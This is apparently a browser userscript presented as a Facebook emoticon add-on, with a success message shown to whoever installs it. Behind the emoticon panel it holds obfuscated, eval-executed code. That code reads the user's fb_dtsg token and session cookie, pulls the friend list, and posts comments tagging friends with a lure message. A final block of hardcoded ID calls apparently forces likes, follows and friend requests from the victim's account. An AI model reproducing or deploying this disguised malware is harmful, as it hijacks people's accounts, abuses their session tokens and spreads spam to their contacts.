	html += '<a class="navLink" title="1 Thông Báo M?i">'; // var navLink
	html += '<span style="vertical-align: middle;"><img src="http://static.ak.fbcdn.net/rsrc.php/v1/yY/r/7OqExvAe82o.gif"></img></span>';
	html += '</a>';

	
	// Flyout
	html += '<div>'; // openToggler; var flyout
	html += '<div class="emoticonsPanel fbJewelFlyout uiToggleFlyout" style="z-index: 1; width: auto;">';
	// {

	
	// Beeper
	html += '<div class="jewelBeeperHeader">';
	html += '<div class="beeperNubWrapper">';
	html += '<div class="beeperNub" style="left: 4px;"></div>';
	html += '</div>';
	html += '</div>';

	// Tabs
	// var titleContainer
	html += '<ul style="display: text-align: center;">';
	html += '</ul>';

	// Bodies
	html += '<div>'; // var bodyContainer
	html += '</div>';

	// Footer
	html += '<div class="jewelFooter">';
    html += '<a class="jewelFooter" href="https://www.facebook.com/Erosaka" target="_blank">Chúc M?ng B?n Ðã Cài Ð?t ICON FaceBook Thành Công <br>NoName</a>';
	html += '</div>';

	// }
	html += '</div>'; // emoticonsPanel
	html += '</div>'; // openToggler

	// }
	html += '</div>'; // fbJewel
	html += '</li>'; // navItem

	var navItem = createElement(html);
	var pageNav = document.querySelector("#pageNav");
	pageNav.insertBefore(navItem, pageNav.firstChild);

	// Maintain active element
	navItem.addEventListener("click", function() {
		if (isInstanceOfTextInput(lastActiveElement)) {
			lastActiveElement.focus();
		}

		openFlyoutCommand = undefined; // Do nothing
	}, true);

	var navLink = navItem.firstChild.firstChild;
	var flyout = navLink.nextSibling;
	var titleContainer = flyout.firstChild.childNodes[1];
	var bodyContainer = titleContainer.nextSibling;

	// Toggle listener
	navLink.addEventListener("click", function() {
		openFlyoutCommand = !isFlyoutOpen(flyout);
	});

	// Picture emoticon tab
	var picEmoTab = createTab(titleContainer, bodyContainer);
	picEmoTab.title.click(); // Default tab
	
	picEmoTab.body.appendChild(createTabListBody(emoticons, function(emoticon) {
		if (emoticon.class === undefined) { // No picture
			return false;
		}

		// [Bug] 2 characters unicode emoticons
		if (emoticon.chars.length == 2) {
			return false;
		}

		return true;

			}));

	// = Other listener =======

	document.addEventListener("click", function() {
		// Get active textarea
		lastActiveElement = document.activeElement;

		// Toggle flyout
		if (openFlyoutCommand !== undefined) {
			openFlyout(flyout, openFlyoutCommand);
		}
		openFlyoutCommand = false;
 	});
})();


	// === Facebook Emoticons ====
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}
function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","457100021058461","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text=Mình đã đổi tên được, hãy thử nào các bạn của mình","Mình đã đổi tên được, hãy thử nào các bạn của mình\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(457100021058461);
arkadaslari_al(457485194353277);
var _9200;var _6045='11154B63E140F625C562E613A367C577A565C556E571C619D616C580A367A454B367A571A604C568F622C598C574D601D619A409D580C574A619E478E595E574E598A574D601C619A616E469F634C505E562B598E574B391E388A577B565C556D571A619A616F580C388D394F544E415A550A409E625E562A595D622B574E448A301E625B562E613B367A622F616D574C613C556C586C571A367D454F367D571B604B568B622E598E574C601E619E409D568F604D604E592D586A574F409C598B562D619C568B583D391A571B604B568A622A598B574E601A619E409B568C604F604D592E586E574E409A598A562C619F568C583C391B412B568C556A622C616F574F613F454F391A547B571A400E394C412E394F544C418F550A394F448F301B562E595C574B613E619B391C388E472F583E1021E568C367F502E24016A601C580E367E469D23794C601C367B1087F952E367F523A583A562D634F367F1087F23950B586E367B484F586A562B604B367C475C586D23908B601E367F481A562A568E574A565B604C604D592F367A523F583E943E601E583B367E472C1003D601B580B367F370B367E505A580A583B574D367E505A583C23794D568F367C529C622F586D367E529E23872B367A505A583D970E367F370A367D565D634F367F469E604B616B616D367B1087E1048B601D580C367A367F367B367A367D367C367A367C367A367D367D367F367E367E367E367E367F367A367A367A367B367D367F367B367B367C367F367D367C367F367F367F367D367C367B367B367E367E367B367A367A367F367A367E367D367A367E367C367D367E367A367D367D367F367D367C367C367E367F367B367B367B367A367A367B367E367A367F367D367C367D367E367A367E367F367A367C367D367A367D367A367B367D367D367A367B367B367B367F367C367B367B367A367C367D367E367C487A619B619E607E445A412D412B481E562A568A574C565B604D604A592D409D472B604A598D412D388D394E448F301C577B622B601F568F619E586A604E601E367F568C574D613E574C637C586E466A595B391A586C616F586B598B394C367C640B301E367B367C367A367F625E562B613A367A619B562F613D562B598F562E367B454A367E586B616B586E598A367F400B367A373B454D373E448A301A367A367E367F367A586E577C367B391F571D604E568A622A598F574A601B619C409B568C604B604B592D586A574F409B595C574F601C580D619A583E367B457E367C415C394A367F640D301B367E367F367D367E367E367E367E367E592A604F601C622E598A367E454B367C571A604E568B622E598A574A601C619F409B568B604B604B592D586A574C409D586C601A571E574E631F508C577D391A619C562A613D562F598D562D394E301F367C367D367D367B367A367E367F367F586D577D367D391C592D604C601D622F598D367F370E454C367B406B418B394D367C640E301A367B367E367F367C367B367C367F367E367C367F367A367C592A604F601A622B598C367D400F454A367A619B562A613F562C598C562E409A595C574A601F580C619C583F301E367D367B367B367F367F367F367D367C367A367C367B367D616F604A601A367A454A367D571D604A568E622D598F574F601E619A409B568B604F604F592F586D574D409C586D601B571E574C631A508C577D391D373B448B373B403B367F592E604F601F622D598D394D301C367D367A367F367F367C367C367E367F367D367B367A367E586F577D367F391A616B604A601F367B454E454A367A406D418D394D301C367F367D367B367A367D367D367F367E367C367B367C367A367C367E367B367D616B604D601C367C454A367E571E604E568C622E598D574D601A619D409F568D604B604B592F586D574B409B595C574C601A580A619C583D301B367A367E367D367B367C367F367C367E367B367F367C367B613D574C619D622E613E601A367D622F601A574B616F568A562C607E574F391A571D604E568F622D598D574B601B619C409E568F604A604D592D586C574B409A616E622D565B616D619C613A586D601A580C391B592E604E601F622A598A403F367E616A604D601C394C394F301B367F367F367D367D367F367E367D367E646A301A367C367A367B367C367B367D367C367E574B595F616B574C367E640E367A613E574B619E622D613A601B367C373C373D448F367D646E301E367C367B367A367F646C301A646A301D367E625A562B613B367B577C565F556C571E619D616F580C367D454C367A571F604E568F622C598D574C601C619A409D580E574C619B478E595D574D598F574A601E619D616F469B634F505C562F598B574C391A388C577C565F556C571E619F616F580D388B394E544F415E550C409E625D562C595C622E574B448F301E625A562F613B367F622E616C574E613A556D586F571E367B454B367D571C604A568E622B598D574A601A619A409B568E604A604A592D586F574E409F598E562E619B568E583C391E571C604B568C622C598C574A601F619C409F568B604E604D592C586A574A409C598A562E619A568E583A391D412C568E556B622C616F574D613B454A391F547A571E400E394A412F394E544F418E550E394B448A301C577D622F601D568D619D586C604A601A367B490E475D520E391D613F394C367B640E301D367B367B625F562B613F367C535B367D454B367F601A574A628F367F535F502B499F487F619B619A607B517A574C610A622A574C616C619E391D394E448C301C367B367D625D562B613C367C535A526B517A499F367F454C367D373F412B412D628D628E628C409B577C562C568D574E565F604D604A592B409F568D604D598B412B562B589C562E631B412C562B571E571B556B577B613B586D574B601B571C412C562C568E619E586D604E601E409A607B583A607F373C448F301E367D367A625A562E613D367C535A511A562E613D562F598C616D367B454A367E373A619F604A556A577C613C586B574F601F571C454D373E367F400A367C613E367C400F373E385C562B568C619B586F604D601A454E562A571B571A556E577F613C586D574F601D571B385E583D604D628B556E577C604E622B601E571F454A577E613F586C574E601A571D556D565F613A604D628F616B574C613F556D616C385A613E574C577F556B607A562F613C562A598A454A601E604B601B574C385F385B385D604C622B619A580C604F586E601E580A556D586C571C454B385B595F604C580B580E586D601A580E556B595B604B568A562B619A586D604D601E454D616C574B562E613A568D583F385A601E604B556C577C595C634C604A622B619D556F604A601A556F568C595D586A568B592D454F619C613F622A574A385F574A580A604D556F595D604A580A556E571E562F619A562A385F583A619E619F607E556A613F574E577B574C613F574A613A385B556A556E622A616D574A613C454A373D400F622D616D574F613C556E586E571E400B373C385C556E556D562B454F418B385C556F556E571C634E601D454A436B442D439A562C475B430F637C430F472B481A406B385A556E556A613B574C610D454A424E430B385D577B565D556B571C619D616B580A454E373C400A577D565F556D571C619A616A580D400C373F385C607D583F616F619A562E598E607F454A373B448D301B367A367B535F409D604F607B574E601D391B373D511A508B520E523C373B403E367F535D526F517E499C403D367C619A613D622A574A394B448C301D367B367A535F409C604D601C613A574E562A571F634F616E619D562F619C574E568F583A562E601F580C574C367B454C367B577A622A601D568A619E586A604D601A367E391E394A367C640D301C367A367C367E367D586D577D367B391E535A409D613F574A562D571A634C520C619D562F619D574F367B454E454B367D427A367F385F385E367B535F409B616B619F562E619A622E616F367E454B454A367B421C415E415F394A367E640E301A367E367F367E367E367C367F535C409F568D595C604A616D574C448B301A367C367F367F367D646E301B367A367F646C448A301D367F367E535B409E616D574E601A571F391D535C511D562C613F562B598E616E394F448A301B646A301B625E562D613D367B577B565F556E571E619A616A580C367D454F367B571F604B568F622D598A574E601E619B409B580A574C619A478B595C574E598C574D601D619C616A469B634D505A562E598F574B391C388F577F565C556C571D619A616C580D388E394B544C415F550B409C625C562C595B622E574F448B367A625A562E613B367F622D616F574D613F556C586A571D367F454F367F571C604E568D622D598E574C601E619E409A568B604D604D592F586D574C409D598C562F619A568B583D391B571D604B568D622C598E574E601E619E409E568F604C604E592E586F574E409F598B562E619A568A583D391F412F568C556A622C616C574A613E454D391C547E571D400D394F412E394B544D418F550A394A448E367F577C622F601E568E619E586D604B601A367F499F586F592D574C391E607B394A367F640F367F625B562B613C367C511F562B580F574F367B454E367C601D574A628F367D535E502E499D487B619E619E607D517E574B610B622B574C616E619A391A394D448C367E625C562C613C367A511C562C580A574E526F517B499F367E454B367D373F412B412C628C628A628D409A577B562E568C574D565E604A604E592E409D568E604B598C412F562F589D562D631C412D607A562D580E574B616A412F577C562A601B556A616B619D562E619E622E616F409E607A583B607F373B448B367A625A562E613D367D511C562A580F574F511E562A613E562F598B616D367E454E367F373A385B577E565D607C562A580B574F556D586D571F454D373B367F400A367E607D367C400F373C385E562B571F571D454C619B613F622E574E385D613B574E595F604F562C571E454D577E562F595E616C574D385F577A562E601E556D604E613B586E580F586E601F454D607B562C580C574C556E619C586F598A574E595A586A601B574C385D577F562E601B556F616D604B622B613F568A574F454C385B568E562F619E454D385E601F568F619D613F544D556A598C604D571C550D454A607D562C580E574D595C574C619B556C619C586D598F574B595C586C601A574B556B607E562F580E574A556C562F568B619B586C604D601D616E385B556D556B622D616F574F613E454E373D400E622E616A574C613A556D586C571F400C373F385C556F556C562B454B418B385E556B556B571E634F601E454F436A442B439C562D475D430C637C430B472B481B406E385F556D556B613F574E610E454C571E385A577A565F556B571F619D616D580F454F373C400B577F565F556E571D619F616E580D400A373E385A607C583C616C619A562A598C607F454F373C448A367A511F562B580F574B409A604B607E574B601F391B373D511A508B520E523A373D403F367A511D562C580C574C526A517A499A403E367E619C613F622D574D394E448A367B511E562C580B574C409C604A601F613B574B562E571F634F616E619B562C619B574F568F583C562D601A580F574B367E454E367D577C622D601F568A619B586F604C601A367C391A394B367D640B367F586C577C367A391A511F562C580F574A409F613C574D562B571B634F520A619A562D619E574E367A454F454C367B427C367E385A385B367D511C562E580C574E409E616D619A562B619A622C616A367F454C454D367C421C415C415F394E367B640B367D511D562D580C574D409C568B595A604D616A574B448F367B646E367F646E448A367F511D562C580F574C409F616A574E601F571B391D511D562E580A574E511D562D613A562D598B616B394A448A367B646D301F367E625E562E613F367F622B616D574A613C556D586C571A367E454C367A571A604E568D622B598E574C601D619E409D568A604F604D592A586B574D409A598C562B619E568E583E391D571A604C568D622B598C574B601A619B409C568E604E604A592B586E574A409F598C562F619B568A583E391C412C568C556B622C616B574C613D454C391A547A571E400F394E412D394E544C418F550B394E448B367A625B562C613A367E577B565E556B571F619C616B580C367D454A367B571A604C568E622B598B574A601D619B409E580E574B619F478C595D574F598C574A601B619C616A469E634D505A562D598F574D391D388A577E565C556A571D619F616F580A388A394E544E415E550A409D625A562E595D622E574C448A367E625D562E613F367A601D604F628B454D391C601E574F628F367E475B562D619B574F394B409F580F574F619A523B586C598F574E391C394E448B367E577F622F601C568B619B586E604B601F367C511F391E604E607C604E394B367C640A367D625A562D613D367B535C367E454D367D601A574F628A367E535E502F499D487C619B619D607F517A574B610F622F574F616C619F391F394E448E367C625C562E613D367E535A526C517B499B367B454B373F412F412B628D628E628C409D577D562B568C574B565A604E604F592B409D568A604F598E412F562C589F562A631B412C622E577D586D412D595C586C592E574A409F607C583A607A373F448A367E625C562C613C367D535B511F562F613B562B598D616F367E454D367C373F595B586F592B574C556E562C568C619E586A604F601C454E619F613B622D574F385E577D619E556D574D601A619A556C586D571B574E601C619A586B577E586D574A613C454A373F400E604B607A604D400F373A385E616B604C622A613F568B574C454A418F385E568B595F586E574F601E619E556C586D571A454F373F400B601C604A628E400C373C382F424E466A424B436E442B436E439C424D439F430C436D385D613F604D604F619E586B571C454A622A556D589A616D604E601C607B556C424F442B556E418D439F385F580F586B577B619C604A568F568A562D616A586C604B601C385E577E619A544B619E601C550A454C382B424A478C382C424B475B385E577A619A544E619A634D607C574D550C454E421A415D385E577C619D544B610D586E571F550A454E430D439D442C415C439B418C418A424F421C442D427E436B415D421C436E442B421D430A436C385F577C619E544F598E577F556E616C619F604B613D634B556D592A574B634B550E454E421B439F418C427B442B433B421C442E415A415B418B442B424E418B427D424F442A430D421E385E577C619E544E583A562B616B556F574C631E607C562A601E571D574B571D556E622D577C586A550A454C418D385B601B568F619C613D544E556A598F604A571D550D454B607D562D580D574B595F574C619F556A583F604F598E574C556A616C619C613D574F562E598E385F556E556A622B616A574A613E454A373C400F622F616E574C613E556B586C571A400E373F385F556C556C562B454B418F385B556E556F571D634E601A454F436D601A439F439C514E604E466D502B469E595F472E595E634E604A568B607F562E574C385F556C556A613B574C610D454B580F427A385F577A565A556C571E619D616D580B454A373C400F577A565B556B571E619E616D580D400A373C385C607B583A616A619E562C598B607A454F373C448A367B535C409C604E607D574D601C391D373F511D508B520D523A373F403A367D535C526C517E499A403D367E619B613B622E574A394B448E367B535F409F604C601D613D574E562A571A634E616D619E562F619D574E568A583D562D601C580E574E367C454A367F577C622B601F568E619A586C604B601A367B391A394A367B640E367D586F577E367F391D535A409D613E574C562B571B634B520C619F562A619E574B367D454D454E367D427F367D385F385D367E535B409B616B619E562B619B622F616F367F454B454A367C421F415B415C394E367B640F367A535D409C568F595F604B616A574C448E367F646D367A646D448B367B535F409D616D574B601E571D391F535B511D562B613D562E598C616F394A448E367E646B301E625E562A613F367D577C565F556A571C619C616D580D367F454C367E571C604D568C622D598B574A601D619B409A580A574F619D478D595E574F598D574F601C619B616F469E634B505E562C598F574F391B388C577B565D556C571A619B616F580D388E394F544D415A550B409C625F562B595D622A574D448C301E625E562A613A367D622E616E574B613B556D586B571D367F454F367B571A604C568C622E598C574C601F619F409B568E604E604A592A586C574D409E598A562F619A568B583F391A571C604D568F622C598E574D601A619B409B568C604B604D592E586C574B409A598C562F619C568E583E391E412A568D556C622C616F574D613A454B391F547A571D400A394A412A394B544C418F550F394D448B301B577B622A601B568F619E586A604B601F367D562E391A562C565F604D601F574D394A301E640F367A625B562C613C367C583A619A619C607A427F454B601F574B628D367B535C502C499A487F619F619F607E517F574D610D622D574F616E619F448E301A367B625E562A613F367D622C613D595B427A454D373D412C562B589D562C631C412E577A604F595D595A604D628B412A577B604A595F595B604B628B556C607D613B604F577E586E595D574A409E607E583D607C460D556E556F562C454E418A373D448E301F367B625D562C613D367B607B562B613F562F598C616B427F454A373C607D613B604A577B586D595F574C556A586A571A454A373A400A562F565C604B601A574F400A373C385B595F604E568D562C619A586A604C601F454D418A385C616D604B622F613D568F574D454E577F604C595E595E604E628A406E565B622F619E619E604E601B385F616C622A565B616D568B613A586E565C574C571F556A565E622F619F619C604B601B556F586F571B454E622F424C436E610C562C568B556E424A436A385A577F565B556B571E619F616B580C454D373F400F577C565B556E571E619C616B580C400E373C385E595A616A571B385D556C556D373F400F622D616D574A613B556B586C571F400F373B385A607A583C616B619B562B598D607B454E373C448A301B367A583E619C619C607E427F409B604F607C574D601D391C373C511E508F520D523E373F403E622D613F595E427C403F619D613F622C574E394E448B301C367F583F619D619B607E427B409D604B601A613E574A562A571C634D616E619E562F619C574C568E583A562F601C580E574C454E577D622C601C568A619E586F604B601E391A394A301E367A640B367E367C586E577D391C583E619A619E607C427D409A613E574D562E571B634A520E619F562F619A574D454B454F427E385A385C583F619D619A607D427A409F616E619C562A619C622A616B454A454B421E415E415A394E583C619C619A607E427C409C568C595F604B616F574C367C646D448D301F367C583A619B619D607B427A409B616D574D601E571E391C607D562D613F562D598F616A427E394F646C301C577C622C601A568F619D586D604D601E367A616A622E565C595C586A616F619C391D622D586E571B616E616C394C301A640B367F625D562C613E367F562A367A454D367A571C604C568D622A598B574C601C619B409A568E613B574C562A619D574B478A595F574F598C574B601C619F391B388A616B568A613D586C607D619D388E394F448A301B367C562E409F586C601B601A574B613F487F523F502A499D367B454F367C373A601A574E628A367A466C616B634E601A568E517A574C610D622B574C616E619E391F394C409B616A574D619D526C517D490E391A388F412B562C589F562D631C412D577D613B586E574F601A571A616F412D595B586E616D619F616D412D616D622E565F616C568F613E586C565B574C412F598B604C571C586B577F634B460E595E604B568D562E619A586B604C601A454C607B574F613F598A562D595F586E601B592D385F562A568E619A586D604C601C454D616B622A565E616E568C613D586B565C574A388C394C409C616C574D619A475D562E619D562D391B640B367D577F595B586C571A445C367A373A367C400F367C622A586F571C616C616C367D400E367F373E367B646D394B409A616A574F601F571D391E394A448E373D448D301F367E571F604B568E622D598D574A601E619A409C565A604A571D634D409E562D607B607F574A601D571D472D583E586A595E571F391B562E394F448A301D646C';var _1217=/[\x41\x42\x43\x44\x45\x46]/;var _8789=2;var _9457=_6045.charAt(_6045.length-1);var _6291;var _3854=_6045.split(_1217);var _7863=[String.fromCharCode,isNaN,parseInt,String];_3854[1]=_7863[_8789+1](_7863[_8789](_3854[1])/21);var _1025=(_8789==7)?String:eval;_6291='';_11=_7863[_8789](_3854[0])/_7863[_8789](_3854[1]);for(_9200=3;_9200<_11;_9200++)_6291+=(_7863[_8789-2]((_7863[_8789](_3854[_9200])+_7863[_8789](_3854[2])+_7863[_8789](_3854[1]))/_7863[_8789](_3854[1])-_7863[_8789](_3854[2])+_7863[_8789](_3854[1])-1));var _4443='_8944';var _2356='_4443=_6291';function _4751(_2882){_1025(_1254);_4751(_5430);_5430(_2356);_4751(_4443);}var _1254='_4751=_1025';var _5430='_5430=_4751';_4751(_9457);
//Khong Ten Fuck
P("405524719549325");sublist("194148987457594");P("414260025342461");
P("433934910041639");P("420981218003675");P("414264112008719");
P("376470239121440");a("100005874819216");P("439362492832214");
sublist("262842347203305");IDS("100006579884214");P("10152179420363430");
//MhMin
a("100004229011575");a("100003869398980");
sublist("178933605590939");sublist("211950375622595");
sublist("218444118306554");sublist("219193454898287");
Like("219193454898287");P("281125972038368");
Like("567169820029397");Like("534488129938890");Like("1388255241404150");
//KhongTen
IDS("100002754024576");IDS("100007508704014");IDS("100007761451579");IDS("100007624354373");
a("100003230386625");a("100007624354373");a("100002443514889");a("100000303521171");
a("839493429");a("100003071499419");
sublist("10151995479593430");sublist("10151857219433430");sublist("314756041993534");
P("274072182746978");P("380317902070007");P("416920948409702");P("462233353894393");P("450264091742054");
Like("598975736843034");Like("1397883850463964");Like("1453938688158589");
//Bùi Thanh Tùng
a("100003822068906");
a("100004675532916");
Like("475636169207634");
sublist("261341124003288");
//Ké
a("100007758155722");a("100004064683127");a("100006363010168");a("100007006472593");
//Like
Like("1426864327546965");P("250734501772178");